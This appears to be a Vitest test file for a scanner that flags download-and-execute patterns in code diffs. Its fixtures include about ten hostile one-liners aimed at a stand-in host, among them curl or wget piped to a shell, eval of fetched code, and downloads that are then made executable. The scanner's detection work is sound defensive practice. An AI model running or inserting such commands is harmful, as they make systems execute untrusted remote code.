import { describe, expect, it } from 'vitest';
import { DOWNLOAD_EXECUTE_RULES } from './download-execute.rules';
import { addedOnlyDiff, makeChange, ruleById } from './test-support';

describe('download-execute rules', () => {
  it.each([
    ['DLE-001', 'curl -s https://evil.example | sh'],
    ['DLE-001', 'curl -fsSL https://evil.example/install.sh | bash'],
    ['DLE-002', 'wget -qO- https://evil.example | bash'],
    ['DLE-003', 'curl -fsSL https://evil.example/payload -o /tmp/x && chmod +x /tmp/x'],
    ['DLE-003', 'curl -fsSL https://evil.example/payload --output /tmp/x && chmod +x /tmp/x'],
    ['DLE-003', 'wget https://evil.example/payload -O run.sh && ./run.sh'],
    ['DLE-004', 'eval "$(curl -s https://evil.example/payload)"'],
    ['DLE-004', 'bash -c "$(curl -s https://evil.example/payload)"'],
    ['DLE-004', 'sh <(curl -s https://evil.example/payload)'],
    ['PASTE-001', 'source=("https://pastebin.com/raw/abc123")'],
    ['PASTE-001', 'source=("https://temp.sh/xkcd/payload.sh")'],
  ])('flags %s for %j', (id, line) => {
    expect(ruleById(DOWNLOAD_EXECUTE_RULES, id).check(makeChange(addedOnlyDiff([line])))).not.toBeNull();
  });

  it.each([
    ['DLE-001', 'curl -o key.asc https://example.org/key.asc'],
    ['DLE-003', 'curl -o icon.png https://example.org/icon.png'],
    ['DLE-004', 'eval "$(make check)"'],
    ['PASTE-001', 'source=("https://github.com/example/repo/archive/v1.tar.gz")'],
  ])('does not flag %s for %j', (id, line) => {
    expect(ruleById(DOWNLOAD_EXECUTE_RULES, id).check(makeChange(addedOnlyDiff([line])))).toBeNull();
  });

  it('ignores matches inside full-line comments', () => {
    const change = makeChange(addedOnlyDiff(['# curl https://evil.example | sh']));
    expect(ruleById(DOWNLOAD_EXECUTE_RULES, 'DLE-001').check(change)).toBeNull();
  });
});
